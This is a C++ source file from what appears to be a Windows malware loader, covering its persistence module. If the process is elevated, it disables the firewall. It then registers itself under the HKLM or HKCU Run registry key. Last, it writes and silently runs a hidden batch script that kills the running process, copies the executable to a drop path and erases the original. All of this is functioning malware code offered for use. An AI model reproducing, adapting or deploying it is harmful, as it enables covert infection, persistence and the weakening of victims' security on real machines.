#include "persistency.h"
#include "common.h"
#include "fw_disabler.h"
#include <windows.h>
#include <comdef.h>


#include <Shlwapi.h>
#pragma comment (lib, "Shlwapi.lib")

#ifdef PERSISTENCY


BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName, BOOL byAdmin)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	if (byAdmin)
		lResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
	else
		lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args, BOOL byAdmin)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
		wcscat_s(szValue, count, args);

	if (byAdmin)
		lResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
	else
		lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

const wchar_t* GetWC(const char* c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	mbstowcs(wc, c, cSize);

	return wc;
}

void startup_adjust()
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize))
			fRet = Elevation.TokenIsElevated;
	}

	if (fRet)
		disable_firewall();

	if (!IsMyProgramRegisteredForStartup(APP_NAME_FOR_WINREG, FALSE) && !IsMyProgramRegisteredForStartup(APP_NAME_FOR_WINREG, TRUE))
	{

		if (hToken)
			CloseHandle(hToken);

		char username[50];
		DWORD size = 50;
		GetUserName(username, &size);
		char normal_path[512];
		sprintf(normal_path, LOADER_DROP_PATH, username);

		RegisterMyProgramForStartup(APP_NAME_FOR_WINREG, fRet ? LOADER_DROP_PATH_ADMIN : GetWC(normal_path), L"", fRet);

		char batch_buf[2048];

		//#define LOADER_DROP_BATCH	"@echo off\r\n" \
		//							"taskkill /f /im %s" \
//							"copy %s %s" \
//							"erase %s" \
//							"%s"
		TCHAR buffer[MAX_PATH] = { 0 };
		TCHAR * out;
		DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
		GetModuleFileName(NULL, buffer, bufSize);
		out = PathFindFileName(buffer);

		_bstr_t b(LOADER_DROP_PATH_ADMIN);
		sprintf(batch_buf, LOADER_DROP_BATCH, out, buffer, fRet ? (const char*)b : normal_path, buffer, fRet ? (const char*)b : normal_path);
		CHAR czTempPath[MAX_PATH] = { 0 };
		GetTempPathA(MAX_PATH, czTempPath);

		char out_path[MAX_PATH];
		sprintf(out_path, "%s\\1.bat", czTempPath);
		std::ofstream myfile;
		myfile.open(out_path);
		myfile << batch_buf;
		myfile.close();

		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		char run_batch[MAX_PATH];
		sprintf(run_batch, BATCH_CMD_LINE, out_path);
		CreateProcess(NULL, run_batch, NULL, NULL, FALSE,
			CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	}
}
#endif // PERSISTENCY